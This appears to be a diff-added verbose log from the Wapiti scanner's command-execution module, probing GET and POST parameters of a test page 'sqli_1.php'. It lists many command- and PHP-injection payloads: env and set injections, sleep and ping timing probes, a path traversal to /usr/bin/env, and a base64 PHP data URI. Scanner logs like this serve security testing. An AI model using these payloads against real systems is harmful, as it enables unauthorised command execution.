+2024-03-20 16:41:27.605 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=search%0Aenv%3B (1)
+2024-03-20 16:41:27.615 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%26set%26 (1)
+2024-03-20 16:41:27.624 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=set (1)
+2024-03-20 16:41:27.634 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=env (1)
+2024-03-20 16:41:27.642 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%2Fe%00 (1)
+2024-03-20 16:41:27.653 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:41:27.663 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:41:27.674 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:41:27.684 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:41:27.692 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:41:27.702 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:41:27.714 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:41:27.724 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:41:27.735 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:41:27.745 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:41:27.756 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F (1)
+2024-03-20 16:41:27.766 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23 (1)
+2024-03-20 16:41:27.775 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D (1)
+2024-03-20 16:41:27.786 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%60%29%60 (1)
+2024-03-20 16:41:27.797 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%60sleep%2060%60 (1)
+2024-03-20 16:41:27.806 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%3Bsleep%2060%3B (1)
+2024-03-20 16:41:27.816 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=a%7Csleep%2060%3B (1)
+2024-03-20 16:41:27.829 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] GET http://web/sqli_1.php?title=default&action=%26ping%20-n%2025%20127.0.0.1%26 (1)
+2024-03-20 16:41:27.848 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php (1)
+2024-03-20 16:41:27.860 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2
+2024-03-20 16:41:27.863 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%3Benv%3B&security_level=2
+2024-03-20 16:41:27.870 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%7Cenv%7C&security_level=2
+2024-03-20 16:41:27.877 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%3Benv%3B&security_level=2
+2024-03-20 16:41:27.885 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%3Benv%3B&security_level=2
+2024-03-20 16:41:27.893 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&security_level=2
+2024-03-20 16:41:27.900 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%3Benv%3B&security_level=2
+2024-03-20 16:41:27.906 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit%0Aenv%3B&security_level=2
+2024-03-20 16:41:27.912 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%26set%26&security_level=2
+2024-03-20 16:41:27.918 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=set&security_level=2
+2024-03-20 16:41:27.924 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=env&security_level=2
+2024-03-20 16:41:27.931 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%2Fe%00&security_level=2
+2024-03-20 16:41:27.938 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:41:27.944 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:41:27.952 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:41:27.958 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:41:27.966 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:41:27.972 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:41:27.978 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:41:27.986 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:41:27.995 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:41:28.001 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:41:28.009 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&security_level=2
+2024-03-20 16:41:28.016 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&security_level=2
+2024-03-20 16:41:28.023 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&security_level=2
+2024-03-20 16:41:28.030 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%60%29%60&security_level=2
+2024-03-20 16:41:28.035 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%60sleep%2060%60&security_level=2
+2024-03-20 16:41:28.042 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%3Bsleep%2060%3B&security_level=2
+2024-03-20 16:41:28.049 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=a%7Csleep%2060%3B&security_level=2
+2024-03-20 16:41:28.055 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=%26ping%20-n%2025%20127.0.0.1%26&security_level=2
+2024-03-20 16:41:28.064 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%3Benv%3B
+2024-03-20 16:41:28.071 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%7Cenv%7C
+2024-03-20 16:41:28.077 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%3Benv%3B
+2024-03-20 16:41:28.083 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%3Benv%3B
+2024-03-20 16:41:28.090 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 16:41:28.098 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%3Benv%3B
+2024-03-20 16:41:28.104 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=2%0Aenv%3B
+2024-03-20 16:41:28.111 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%26set%26
+2024-03-20 16:41:28.118 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=set
+2024-03-20 16:41:28.125 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=env
+2024-03-20 16:41:28.132 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%2Fe%00
+2024-03-20 16:41:28.138 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.145 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.153 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.160 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.167 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.174 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.181 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.188 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.195 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.202 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.209 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.217 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.223 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 16:41:28.231 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%60%29%60
+2024-03-20 16:41:28.238 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%60sleep%2060%60
+2024-03-20 16:41:28.244 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%3Bsleep%2060%3B
+2024-03-20 16:41:28.251 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=a%7Csleep%2060%3B
+2024-03-20 16:41:28.258 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_security_level=submit&security_level=%26ping%20-n%2025%20127.0.0.1%26
+2024-03-20 16:41:28.274 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13
+2024-03-20 16:41:28.276 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%3Benv%3B&bug=13
+2024-03-20 16:41:28.282 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%7Cenv%7C&bug=13
+2024-03-20 16:41:28.288 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%3Benv%3B&bug=13
+2024-03-20 16:41:28.295 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%3Benv%3B&bug=13
+2024-03-20 16:41:28.302 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C&bug=13
+2024-03-20 16:41:28.308 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%3Benv%3B&bug=13
+2024-03-20 16:41:28.315 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%0Aenv%3B&bug=13
+2024-03-20 16:41:28.321 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%26set%26&bug=13
+2024-03-20 16:41:28.327 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=set&bug=13
+2024-03-20 16:41:28.334 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=env&bug=13
+2024-03-20 16:41:28.341 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%2Fe%00&bug=13
+2024-03-20 16:41:28.349 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
+2024-03-20 16:41:28.355 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
+2024-03-20 16:41:28.363 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
+2024-03-20 16:41:28.370 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
+2024-03-20 16:41:28.376 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
+2024-03-20 16:41:28.383 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
+2024-03-20 16:41:28.390 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
+2024-03-20 16:41:28.398 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
+2024-03-20 16:41:28.405 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
+2024-03-20 16:41:28.412 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
+2024-03-20 16:41:28.419 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F&bug=13
+2024-03-20 16:41:28.425 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23&bug=13
+2024-03-20 16:41:28.433 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D&bug=13
+2024-03-20 16:41:28.441 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%60%29%60&bug=13
+2024-03-20 16:41:28.448 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%60sleep%2060%60&bug=13
+2024-03-20 16:41:28.454 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%3Bsleep%2060%3B&bug=13
+2024-03-20 16:41:28.460 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=a%7Csleep%2060%3B&bug=13
+2024-03-20 16:41:28.467 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=%26ping%20-n%2025%20127.0.0.1%26&bug=13
+2024-03-20 16:41:28.475 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%3Benv%3B
+2024-03-20 16:41:28.483 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%7Cenv%7C
+2024-03-20 16:41:28.490 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%3Benv%3B
+2024-03-20 16:41:28.498 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%3Benv%3B
+2024-03-20 16:41:28.504 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fusr%2Fbin%2Fenv%7C
+2024-03-20 16:41:28.511 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%3Benv%3B
+2024-03-20 16:41:28.518 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=13%0Aenv%3B
+2024-03-20 16:41:28.525 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%26set%26
+2024-03-20 16:41:28.532 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=set
+2024-03-20 16:41:28.539 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=env
+2024-03-20 16:41:28.546 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%2Fe%00
+2024-03-20 16:41:28.553 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.560 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.568 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.574 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%22%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.582 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.588 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%27%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.597 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.604 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%22.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.610 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.618 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%27.exit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.624 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%2F%2F
+2024-03-20 16:41:28.631 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=%3Bexit%28md5%28%27w4p1t1_md5%27%29%29%3B%23
+2024-03-20 16:41:28.637 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=data%3A%3Bbase64%2CPD9waHAgZWNobyAndzRwMXQxJywnX2V2YWwnOyA%2FPg%3D%3D
+2024-03-20 16:41:28.643 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%60%29%60
+2024-03-20 16:41:28.651 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%60sleep%2060%60
+2024-03-20 16:41:28.658 | VERBOSE  | wapitiCore.attack.mod_exec:attack:98 - [¨] POST http://web/sqli_1.php (1)
+	data: form_bug=&bug=a%3Bsleep%2060%3B
